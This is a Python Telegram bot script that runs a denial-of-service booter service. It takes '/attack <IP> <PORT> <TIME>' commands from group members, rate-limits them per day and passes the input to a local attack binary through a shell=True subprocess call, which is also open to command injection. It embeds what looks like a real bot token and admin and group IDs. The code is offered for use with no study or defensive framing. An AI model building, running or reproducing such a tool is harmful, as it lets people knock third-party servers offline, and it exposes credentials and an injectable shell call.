#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
import requests
import os
import sys
import socket
# Insert your Telegram bot token here
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')


# Admin user IDs
admin_id = ["7129010361"]

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Default cooldown and attack limits
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # यूजर 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_active_attack  

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if global_active_attack:
        bot.reply_to(message, "⚠️ **अभी एक अटैक पहले से चल रहा है! कृपया खत्म होने का इंतजार करें।**")
        return

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: {CHANNEL_USERNAME}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **BETA CHANNEL JOIN KAR PEHLE FIR AANA** {CHANNEL_USERNAME} 🔥")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
        return

    # **अटैक स्टार्ट करने से पहले फ्लैग सेट करें**
    global_active_attack = True  

    bot.send_message(message.chat.id, f"🚀 **Attack Started on** `{target}:{port}` for `{time_duration}` seconds!")

    full_command = f"./Ravi {target} {port} {time_duration}"
    
    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
        global_active_attack = False  # **अगर कोई एरर आए तो अटैक फ्लैग रीसेट करें**
        return

    bot.send_message(message.chat.id, f"✅ **Attack Completed!** `{target}:{port}` Destroyed!")
    
    # **अटैक खत्म होने के बाद फ्लैग रीसेट करें**
    global_active_attack = False